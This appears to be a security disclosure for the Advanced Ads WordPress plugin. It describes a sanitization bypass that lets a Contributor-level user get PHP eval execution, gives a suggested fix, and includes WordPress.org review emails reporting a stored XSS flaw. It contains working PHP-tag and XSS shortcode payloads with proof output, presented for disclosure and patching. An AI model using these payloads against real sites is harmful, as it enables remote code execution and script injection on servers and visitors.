**Message:**
Identified an incomplete fix for CVE-2025-13592 in Advanced Ads 2.0.22.

Vulnerability summary:

-   Type: Authenticated Remote Code Execution (Patch Bypass)
-   File: includes/class-shortcodes.php (sanitize_shortcode_content)
-   Sink: includes/ads/class-ad-plain.php (eval())
-   Auth required: Contributor (draft preview, no publish needed)
-   Precondition: An existing ad with allow_php=true must be present on the site

The sanitize_shortcode_content() function uses a single-pass regex. A crafted payload (<<?php?>?php ...) causes the regex to reconstruct a live PHP tag after stripping an inner block. The resulting PHP tag survives sanitization and reaches the eval() sink via the content and change-ad\_\_content shortcode attributes.

The 2.0.21/2.0.22 fix only hardened the ad_args vector (sanitized twice). The content and change-ad\_\_content attributes are sanitized once only - the bypass survives on these paths.

Confirmed locally on Advanced Ads 2.0.22:

-   Contributor saves draft post with [the_ad id=X content="<<?php?>?php echo 31337;"]
-   GET /?p=ID&preview=true (authenticated as Contributor)
-   Response: <div id="local-...">31337</div> - PHP executed server-side

**PRECONDITION**: There must be at least one ad of type `plain`/`content` on the site with `allow_php = true` — the documented “Allow PHP” feature — and global PHP execution must not be disabled (`Conditional::is_php_allowed()` is true by default, and false only if `ADVANCED_ADS_DISALLOW_PHP` or `DISALLOW_FILE_EDIT` are defined). The attacker CANNOT enable `allow_php` themselves — it is forced to false, see below — they hijack an existing PHP ad.

## Vulnerable code

```php
// class-shortcodes.php — single-pass regex sanitization (the 2.0.21/2.0.22 RCE fix)
private function sanitize_shortcode_content( string $content ): string {
    // one preg_replace pass — does NOT re-scan its own output
    $content = preg_replace( '/<\?(?:php|=)?[\s\S]*?(?:\x3F\x3E|$)/i', '', $content );
    return $content ? $content : '';
}

private function prepare_shortcode_atts( $atts ): array {
    // ... foreach builds $result, then ad_args path:
    if ( isset( $atts['ad_args'] ) ) {                                   // <-- sanitized TWICE
        $result = array_merge( $result, $this->parse_shortcode_ad_args( $atts['ad_args'] ) ); // pass #1
    }
    // ...
    if ( isset( $result['content'] ) && is_string( $result['content'] ) ) {
        $result['content'] = $this->sanitize_shortcode_content( $result['content'] );          // pass #2 (ad_args) / pass #1 (direct content attr)
    }
    return $result;
}

private function set_shortcode_atts( $entity, $atts ): void {
    foreach ( $atts as $key => $value ) { $entity->set_prop_temp( $key, $value ); }
    if ( isset( $atts['allow_php'] ) ) { $entity->set_prop_temp( 'allow_php', false ); } // only forces false IF passed
}
```

```php
// class-ad-plain.php — the eval sink
if ( $this->is_php_allowed() && Conditional::is_php_allowed() ) {
    eval( '?>' . $content );   // $content = attacker-controlled, sanitized only once on the `content` attr path
}
```

## Cause — incomplete fix (Pattern 4)

`sanitize_shortcode_content()` is a **single-pass** `preg_replace`: it removes `<? … ?>` / `<? … $` blocks, but does not re-scan its own result. A payload designed so that removing an internal block **reconcatenates** a new PHP tag can bypass it:

`<<?php?>?php echo 31337;` → `preg_replace` removes `<?php?>` → what remains is `<` + `?php echo 31337;` = `<?php echo 31337;` — a **live** PHP tag.

-   `ad_args` vector — the one from CVE 2.0.21: sanitized **twice** — in `parse_shortcode_ad_args`, then again at L165. The second pass sees the properly reconstructed tag and removes it → **protected**.

-   `content=""` and `change-ad__content=""` vectors: sanitized **only once** — at L165 only → the bypass survives → `eval()`. **The fix only hardened the reported vector, not its sibling vectors.**

`set_shortcode_atts` forces `allow_php=false` only if the `allow_php` attribute is present in the request → the attacker cannot enable it, but by targeting an existing PHP ad where `allow_php=true` is not passed again, the lock does not apply and the injected content is evaluated.

## ATTACK FLOW

A Contributor writes a post:

`[the_ad id=<ID of an allow_php ad> content="<<?php?>?php SYSTEM_CMD;"]`

→ page rendering — either draft preview by the Contributor themselves, or public viewing
→ `Shortcodes::render_ad`
→ `prepare_shortcode_atts` — single-pass sanitization on the `content` attribute
→ `set_shortcode_atts` — `allow_php` untouched, remains true
→ `get_the_ad`
→ `Ad_Plain::prepare_frontend_output`
→ `eval('?>' . '<?php SYSTEM_CMD;')`
→ RCE.

## Proof

Proof:

1. Regex bypass + eval — exact replica:

```text
[concat_bypass] raw : <<?php?>?php echo "RCE_PROOF_" . (7*6) ...
                san : <?php echo "RCE_PROOF_" . (7*6) ...   => *** PHP TAG SURVIVES ***
                EVAL OUTPUT: RCE_PROOF_42
```

2. Full chain via the plugin’s REAL private methods — using reflection — on an ad with `allow_php=true` — ID 66:

```text
attribute: content            -> prepared content = [<?php echo 40+2;]  -> RENDER = [42]  *** RCE CONFIRMED ***
attribute: change-ad__content -> prepared content = [<?php echo 40+2;]  -> RENDER = [42]  *** RCE CONFIRMED ***
attribute: ad_args (JSON)     -> prepared content = []                  -> no RCE  (double-sanitize = protected)
```

3. End-to-end HTTP — published post, author = Contributor `aacontrib`, containing:

```text
[the_ad id=66 content="<<?php?>?php echo 31337;"]
```

retrieved as a **guest**:

```text
GET http://localhost:3005/aa-rce-poc2/   (HTTP 200)
entry-content : <div id="local-2787659511">31337</div>   <-- injected PHP executed and rendered in the served page
```

## FIX

Apply sanitization in a loop until a fixed point is reached — or remove every occurrence of `<?` — and apply it to **all** content paths, not only `ad_args`:

```php
private function sanitize_shortcode_content( string $content ): string {
    do {
        $before  = $content;
        $content = preg_replace( '/<\?(?:php|=)?[\s\S]*?(?:\x3F\x3E|$)/i', '', $content );
    } while ( $content !== $before );           // re-scan until stable

    // Additional defense: neutralize any remaining '<?'
    $content = str_replace( '<?', '', (string) $content );

    return $content ?? '';
}
```

Ideally: never re-evaluate PHP injected through a shortcode. Gate `allow_php` only on the **stored** content, never on a shortcode override. In other words, force any `content` override to be treated as non-PHP, regardless of the attribute.

---

Emails:

We've received a report from a third party concerning a security vulnerability in your plugin. Your plugin has not yet been closed, however if in the next 30 days the issue remains unpatched or we receive no communication we will be forced to close the plugin due to inaction.

https://wordpress.org/plugins/advanced-ads/

Here's what you need to do:
Vulnerability Remediation:
Thoroughly review this email and the report included below.
Implement necessary code modifications to eliminate the vulnerability.
Address any additional similar concerns identified.
Perform a Security Review:
Conduct a comprehensive security and WordPress coding standards review of your plugin's codebase.
Utilize the Plugin Check Plugin as a tool to identify and rectify any issues: https://wordpress.org/plugins/plugin-check/
We expect all issues detected by Plugin Check Plugin will be resolved before you resubmit the plugin for review.
Plugin Update:
Increment your plugin's version number.
Update the "Tested up to" version within your readme.txt file to reflect the latest WordPress release.
Submit the Update:
Commit the updated code to your plugin's SVN repository.
Be sure to properly tag the new release.
Please review our documentation on how to use SVN - https://developer.wordpress.org/plugins/wordpress-org/how-to-use-subversion/#best-practices - as improper SVN usage can delay our reviews.
Reply to this email to request a re-review.

Important Considerations:
Thoroughness: A comprehensive review of your entire plugin will be conducted upon resubmission. Any additional security or guideline issues must be resolved before your plugin can be relisted.
Timeframe: You have 14 days from the time of this email to reply confirming you are aware of the issue and 30 days total to address the reported vulnerability in order to avoid closure.
Public Disclosure: This security bug was reported to us from a third party. We can not prevent public disclosure, dispute their claim or change their disclosure timeline (which may occur before our 30 day timeframe). We are notifying you of the information we have been provided in order to help you begin working on a patch.
Support: If you require clarification, encounter challenges or need more time, please reply to this email.
Failure to act: Failure to communicate or make substantial progress within this timeframe will necessitate the closure of your plugin to protect users.

Vulnerability Report

We are sending a private security report regarding the WordPress plugin "Advanced Ads - Ad Manager & AdSense" on WordPress.org, specifically the public package version 2.0.21.

We validated a shortcode-based stored XSS issue in the current public version through the `ad_args` shortcode parameter, specifically the `override` field.

In the public 2.0.21 code:

-   `includes/class-shortcodes.php` decodes attacker-controlled `ad_args` JSON
-   only `content` receives special sanitization
-   `override` is returned untouched
-   `includes/functions-ad.php` then returns `args['override']` directly when present

Relevant code flow:

-   `includes/class-shortcodes.php:149-150`
-   `includes/class-shortcodes.php:189-199`
-   `includes/functions-ad.php:45-46`

In local validation against version 2.0.21:

-   we created a valid `advanced_ads` post
-   we stored the shortcode below in a public post authored by an `Author` user:

[the_ad id="8" ad_args="%7B%22override%22%3A%22ADV17_ADARGS_XSS%3Cimg%20src%3Dx%20onerror%3Dalert%281708%29%3E%22%7D"]

-   rendering the shortcode returned:

ADV17_ADARGS_XSS<img src=x onerror=alert(1708)>

-   the public page response also contained that payload in the rendered HTML

This indicates that attacker-controlled markup supplied via `ad_args["override"]` is still rendered unsafely in the latest public package.

This is not a full review of your plugin. Once you've replied, we will re-scan your entire plugin, looking for both security issues and guideline violations. Should we find other issues on a re-review, you will be required to address those issues as well.

We understand security issues are surprising and demand your immediate attention. Prompt action on your part will ensure the continued trust and safety of your users. Please don't hesitate to reach out if you have any questions or require assistance.

---

We've reviewed the changes you've made. While we appreciate the effort to address the reported XSS vulnerability, we can't reopen your plugin just yet.

We noticed you're using a custom solution to prevent XSS payloads. While this approach might work against the specific proof of concept provided, it's often possible to bypass these types of bespoke solutions. We need to ensure your plugin has robust, industry-standard XSS protection in place.

Recommended Approach:

WordPress provides a solid framework for handling security concerns like XSS. We strongly recommend adhering to their best practices, which involve a three-pronged approach:
Validation: Verify that the data inputted by the user matches the expected format and type.
Sanitization: Cleanse the input data to remove any potentially harmful characters or code.
Escaping: Securely output data to the user by escaping special characters, preventing them from being interpreted as code.
To guide your implementation, please review the following resources:
https://codex.wordpress.org/Validating_Sanitizing_and_Escaping_User_Data
https://developer.wordpress.org/apis/security/data-validation/
https://developer.wordpress.org/apis/security/sanitizing/
https://developer.wordpress.org/apis/security/escaping/

Please implement these best practices and let us know when you've updated your plugin. We're committed to working with you to ensure your plugin is secure for all users.
